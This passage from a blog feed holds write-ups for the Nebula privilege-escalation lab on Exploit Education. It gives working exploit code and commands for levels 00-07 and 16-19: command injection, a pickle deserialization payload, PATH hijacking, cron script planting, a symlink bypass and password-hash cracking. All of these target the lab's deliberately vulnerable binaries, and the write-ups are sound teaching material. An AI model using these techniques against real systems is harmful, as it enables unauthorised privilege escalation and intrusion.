&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod&lt;/code&gt; the script to allow execution. With that file, I was able to call the perl script with the username “`/*/AAA`”. As you can see, there are no spaces or lower case letters in the string, thus it will not be transformed. The backticks are required to allow execution of the inline bash before &lt;code class=&quot;highlighter-rouge&quot;&gt;egrep&lt;/code&gt;. The string is converted to hexadecimal for URL purposes, resulting in “%60%2F%2A%2FAAA%60”. The perl script is executed by &lt;code class=&quot;highlighter-rouge&quot;&gt;wget -O - &quot;http://127.0.0.1:1616/index.cgi?username=%60%2F%2A%2FAAA%60&quot;&lt;/code&gt;. After this, inspect the file “/tmp/output”, which should have the string “You have successfully executed getflag on a target account”, indicating success.&lt;/p&gt;

&lt;h2 id=&quot;level17&quot;&gt;Level17&lt;/h2&gt;

&lt;p&gt;This level requires abusing security risks within python’s &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle&lt;/code&gt; module. On python’s official documentation &lt;a href=&quot;https://docs.python.org/3/library/pickle.html&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;pickle&lt;/code&gt;&lt;/a&gt;, it is well documented it can run arbitary code. As the vulnerable python file is ran under the “flag17” account, we use it to achieve our desired effect. Further investigation online reveals that the &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt; method of the pickled class is ran when loading the pickled data. Therefore, the goal is to dump a pickled object with a custom &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt; method and send it to the desired port.&lt;/p&gt;

&lt;p&gt;The code we want to run is &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;. As stdout is not displayed, we need to pipe it into a file. I selected a random file in “/tmp”. The full python code is as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;picke&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10007&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'getflag &amp;gt; /tmp/res.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;skt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Run the above code using &lt;code class=&quot;highlighter-rouge&quot;&gt;python2&lt;/code&gt;, and check the contents of the file “/tmp/t.txt”. It should contain the desired output, indicating this level is solved.&lt;/p&gt;

&lt;h2 id=&quot;level18&quot;&gt;Level18&lt;/h2&gt;

&lt;p&gt;This is what I believe to be the hardest level so far. Looking at the source code, we can notice it is coded quite defensively. All but one string comparisons are length guarded, and the remaining one cannot be abused.&lt;/p&gt;

&lt;p&gt;One potential exploit is the format string exploit in &lt;code class=&quot;highlighter-rouge&quot;&gt;notsupported&lt;/code&gt;, where the string &lt;code class=&quot;highlighter-rouge&quot;&gt;what&lt;/code&gt; is printed directly in line 48. Checking the protections on the executable, it appears &lt;code class=&quot;highlighter-rouge&quot;&gt;FORTIFY_SOURCE&lt;/code&gt; has been enabled. This prevents directly overwriting the &lt;code class=&quot;highlighter-rouge&quot;&gt;globals.loggedin&lt;/code&gt; variable. During my research, I did discover an interesting paper on &lt;a href=&quot;http://phrack.org/issues/67/9.html&quot;&gt;bypassing such protection&lt;/a&gt;. However, it was too complicated so I went digging for an easier attack.&lt;/p&gt;

&lt;p&gt;A more careful read of the code reveals the program successfully logs in even when the “PWFILE” cannot be read. This reminded me of &lt;a href=&quot;https://en.wikipedia.org/wiki/Resource_exhaustion_attack&quot;&gt;resource exhaustion attacks&lt;/a&gt;, where the software will no longer open more files when the total number of file descriptors allocated to the program has been exhausted. This can be done on a system level (exhausting all files that can be opened by the operating system) or a process level (exhausting all files that can be opened by the process). I feel like the former method is too barbaric, thus I decided to use the latter. The latter limit can be checked with &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -n&lt;/code&gt;, which reveals the maximum number of file descriptors allowed is 1024. Subtracting the 3 default ones (stdin, stdout, stderr), we needed to open 1021 files.&lt;/p&gt;

&lt;p&gt;When actually running the program, one may notice no output is produced as everything is written to a log file. This can be circumvented by setting the log file to “/dev/tty”, which is the terminal. This way, a more clear output can be obtained.&lt;/p&gt;

&lt;p&gt;Looking at the decompiled source code, one may see that that the &lt;code class=&quot;highlighter-rouge&quot;&gt;globals.debugfile&lt;/code&gt; is never closed when it is replaced by another one. This provides the foundation for the exploit. A python program was used to generate a file looking like the following, with “-d /dev/tty” repeated 1021 times:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/flag18/flag18 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /dev/tty &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /dev/tty ... &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /dev/tty
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running the this bash script, we can then use “login pw” to login and “shell” to obtain our shell. Fortunately, the first stage passes, we can login. However, when starting the shell process, the error “/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24” is obtained. This indicates we need to release a file descriptor. The easiest way is to use “closelog” to close the logger after loggin in.&lt;/p&gt;

&lt;p&gt;However, this reveals a new problem: “/home/flag18/flag18: -d: invalid option”. This is caused by the same arguments of /home/flag18/flag18 being passed to /bin/bash. To prevent this, we can add a “–rcfile” option as one of the long options. The new script thus becomes:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/flag18/flag18 &lt;span class=&quot;nt&quot;&gt;--rcfile&lt;/span&gt; /tmp/t &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /dev/tty &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /dev/tty ... &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; /dev/tty
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running the commands described previously now works flawlessly. A bash shell has been opened and typing getflag reveals we have successfully completed this level.&lt;/p&gt;

&lt;h2 id=&quot;level19&quot;&gt;Level19&lt;/h2&gt;

&lt;p&gt;The source code for this program is relatively simple. The program checks the id of the parent process, and if it is root, then we obtain a privileged shell. This immediately reminded me &lt;a href=&quot;https://en.wikipedia.org/wiki/Orphan_process&quot;&gt;orphaned child process&lt;/a&gt;, which are created when the parent process dies before the child. In this case, the child is automatically attached to the “init” process, which is root. This sets up the basic premise of the attack. A PoC can be created by the following C code.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main(){
    if (fork() == 0){
        sleep(1);
        execl(&quot;/home/flag19/flag19&quot;, &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;getflag&amp;gt;/tmp/o&quot;, NULL);
    }else{
        return 0;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After compiling and running the code, the output can be checked at “tmp/o”. Unsuprisingly, it contains the message “You have successfully executed getflag on a target account”.&lt;/p&gt;

</description>
        <pubDate>Tue, 25 Jun 2019 23:44:38 +1000</pubDate>
        <link>zijunh.github.io/2019/06/nebulla-part-2/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/06/nebulla-part-2/</guid>
        
        <category>exploit education</category>
        
        <category>solution</category>
        
        <category>nebula</category>
        
        
        <category>exploit education</category>
        
      </item>
    
      <item>
        <title>Exploit Education - Nebula: Write-up (Part 1)</title>
        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;As the challenges are relatively short, I will be slowly updating this post will the ones I have completed. The VM can be obtained at &lt;a href=&quot;https://exploit.education/nebula/&quot;&gt;Exploit Education&lt;/a&gt;, a website created by Andrew Griffiths that teaches common (and less than common) weaknesses and vulnerabilities in Linux.&lt;/p&gt;

&lt;p&gt;The main purpose of each level is to bypass certain restrictions imposed by the system, and run &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; with the required privileges (pwn).&lt;/p&gt;

&lt;h2 id=&quot;level00&quot;&gt;Level00&lt;/h2&gt;

&lt;p&gt;This is a trivial question that requires some understanding of &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt;. In this particular scenario, &lt;code class=&quot;highlighter-rouge&quot;&gt;man&lt;/code&gt; pages did not help a lot, as it was flooded with options and configurations. After some reading, the following solution was obtained.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-executable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag00&quot;&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This results a list of files that are executable and are ran under the ‘flagxx’ account. Executing the files spawn a shell with sufficient privileges to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;, thus solving the level.&lt;/p&gt;

&lt;h2 id=&quot;level01&quot;&gt;Level01&lt;/h2&gt;

&lt;p&gt;The source code for the level is provided for us. The code extracts the effective user ID and group ID of the process and overwrites the real and saved user and group IDs with them. From my understanding, real ID is the ID of the caller while effective ID is the ID the kernel uses to check for privileges. The target file, &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/flag01/flag01&lt;/code&gt;, has its suid bit set, so the effective ID will be the same as its real ID when it is executed. The file is owned by ‘flag01’, so its real ID will be ‘flag01’. The above information can be verified by inspection of the results of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -al&lt;/code&gt; command. Following the changes of user and group IDs, the program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; with the parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;and&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;now&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;what?&lt;/code&gt;. Interestingly, it looks for &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; in the the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt;. Thus, a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; command can be created and its location can be inserted into the start of the &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; variable. This overrides the real &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt;. Since both the real and effective IDs have been changed to a more privileged account, the fake &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; will be run using escalated privileges as well! We can use this to run the required &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; command.&lt;/p&gt;

&lt;p&gt;The solution is as follows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
&lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;badbash.c
vim badbash.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enter the following lines of C code and save the file:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;getflag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Continue in the bash terminal with the following commands:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc badbash.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag01
./flag01
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;level02&quot;&gt;Level02&lt;/h2&gt;

&lt;p&gt;This level is similar to the previous level. The given program executes the command &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/echo %s is cool&lt;/code&gt; in bash, where &lt;code class=&quot;highlighter-rouge&quot;&gt;%s&lt;/code&gt; is a custom defined string. This string can be defined by overwriting the &lt;code class=&quot;highlighter-rouge&quot;&gt;USER&lt;/code&gt; variable. Furthermore, &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; is used to join two commands and the input string can be manipulated into the form “;getflag;”. The terminal will first execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/echo&lt;/code&gt;, which does nothing when it has no arguments, and then execute &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;. bash may not successfully parse &lt;code class=&quot;highlighter-rouge&quot;&gt;is cool&lt;/code&gt;, but that is not our concern, as &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; has already been executed. As the real ID of this program is &lt;code class=&quot;highlighter-rouge&quot;&gt;flag02&lt;/code&gt; and the suid bit of the file is set, &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; will be executed with the required privileges, and thus successfully unlock the flag.&lt;/p&gt;

&lt;p&gt;The solution can be summarised as follows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag02
&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;';getflag;'&lt;/span&gt;
./flag02
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;level03&quot;&gt;Level03&lt;/h2&gt;

&lt;p&gt;A &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab&lt;/code&gt; is ran every few minutes presumably on the &lt;code class=&quot;highlighter-rouge&quot;&gt;writable.sh&lt;/code&gt; file. Inspecting the contents reveal the following code:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /home/flag03/writable.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ulimit&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 5&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It appears the this script fetches all the files in the “writable.d” directory and performs some commands on it and removes it after it is scanned. &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit -t&lt;/code&gt; simply limits the time allows for the given program to run, and &lt;code class=&quot;highlighter-rouge&quot;&gt;bash -x&lt;/code&gt;, according to the man page, shows all actions done in that script. Both commands do not limit how we access or execute the script, so I simply ignored them. The next reasonable action is to insert our own custom script into the “writable.d” directory. This is possible as we have the sufficient privileges, as evident from the results of &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -al&lt;/code&gt;. With this information in mind, we can derive our solution. A script that executes &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; will be stored in “writable.d”. Executing &lt;code class=&quot;highlighter-rouge&quot;&gt;writable.sh&lt;/code&gt; itself is futile, as it does not have suid bit set, thus we will be running with insufficient privileges. &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab&lt;/code&gt; runs with &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; in default configurations, thus this should be what we need to exploit.  As &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab&lt;/code&gt; redirects the output, we will store the output into a file at a specific location. This can be summarised as the following code.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag03/writable.d
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;getflag &amp;gt; /tmp/res.txt&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; scrpt.sh
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x scrpt.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After waiting a while, check the contents of the “/tmp/res.txt” file by &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /tmp/res.txt&lt;/code&gt;. As expected, it shows we have successfully executed &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; on a required account.&lt;/p&gt;

&lt;h2 id=&quot;level04&quot;&gt;Level04&lt;/h2&gt;

&lt;p&gt;The key line of code that prevents the user from reading the token file directly is &lt;code class=&quot;highlighter-rouge&quot;&gt;strstr(argv[1], &quot;token&quot;) != NULL&lt;/code&gt;. From the &lt;code class=&quot;highlighter-rouge&quot;&gt;man&lt;/code&gt; page, &lt;code class=&quot;highlighter-rouge&quot;&gt;strstr&lt;/code&gt; returns the first occurrence of “token” in “argv[1]”. If the string token does not exist, then “NULL” is returned, and the file can be accessed as usual. If it does, the program throws an error and exits prematurely. To circumvent this, we can create a symbolic link, which is basically pointer to another file. As we can name this what ever we want, the check can be bypassed. The link is created using &lt;code class=&quot;highlighter-rouge&quot;&gt;ln&lt;/code&gt;; as a symbolic link is required, &lt;code class=&quot;highlighter-rouge&quot;&gt;-s&lt;/code&gt; is added as an argument. The solution for this problem is as follows:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /home/flag04/token symlink
/home/flag04/flag04 symlink
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This prints out a long string, which is the password of the flag04 account. Switch into flag04 using &lt;code class=&quot;highlighter-rouge&quot;&gt;su - flag04&lt;/code&gt;, enter the password, and you will have sufficient privileges to run &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;level05&quot;&gt;Level05&lt;/h2&gt;

&lt;p&gt;Digging around the flag05 home folder using &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -al&lt;/code&gt; reveals 2 hidden folders: “.backup” and “.ssh”. “.ssh” hints the way we need to log into “flag05” – via ssh. Unfortunately, out account does not have sufficient privileges to read its contents, thus the entry point must be “.backup”. “.backup” does not appear to be a standard folder name, and inspecting the contents inside reveal a .tgz file that is named “backup”. Inspecting the type of the file using &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; reveals it has gzip compressed data, and fortunately our account can read it. &lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt; back our home folder and extracting the file there using &lt;code class=&quot;highlighter-rouge&quot;&gt;tar zxvf&lt;/code&gt; (z: gzip, x: decompress, v: show name, f: archive file name) produces a “.ssh” folder with ssh authorisation keys. Using that information, we can simple type &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh flag05@localhost&lt;/code&gt; to access flag05’s account. The entire process can be summarised as the following commands:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf /home/flag05/.backup/backup-19072011.tgz
ssh flag05@localhost
getflag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;level06&quot;&gt;Level06&lt;/h2&gt;

&lt;p&gt;After some inspection of the system and &lt;a href=&quot;http://www.linfo.org/etc_passwd.html&quot;&gt;online reading&lt;/a&gt;, I figured out the problem exists in the ‘/etc/passwd’ file. In the past, the encrypted password was stored in this file, which is visible to everyone. Now, encrypted passwords are stored in the file ‘/etc/shadow’, which is not visible to normal users. Inspecting the file, there exists an entry for the user account ‘flag06’, which is ‘flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh’. This provides the password hash for this account.&lt;/p&gt;

&lt;p&gt;As the problem states the unix version is old, it is highly likely that the hash is generated by the &lt;code class=&quot;highlighter-rouge&quot;&gt;crypt&lt;/code&gt; method. To crack the password, the infamous password “john the ripper” should be used. After downloading it from the official website (or from the snap store) in a separate machine, the line with the password is copied into a file. After running &lt;code class=&quot;highlighter-rouge&quot;&gt;john text_file&lt;/code&gt;, the following results were obtained.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 256/256 AVX2])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 642 candidates buffered for the current salt, minimum 1024 needed for performance.
Proceeding with wordlist:/snap/john-the-ripper/current/run/password.lst, rules:Wordlist
hello            (flag06)
1g 0:00:00:00 DONE 2/3 (2019-06-14 20:41) 16.66g/s 294466p/s 294466c/s 294466C/s 123456..betabeta
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It seems we have obtained our password, which is “hello”. After changing the user into “flag06”, we can run &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;, obtaining the desired result.&lt;/p&gt;

&lt;h2 id=&quot;level07&quot;&gt;Level07&lt;/h2&gt;

&lt;p&gt;The source of a perl program is provided.&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/perl&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CGI&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;qw{param}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Content-type: text/html\n\n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;sub &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ping&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
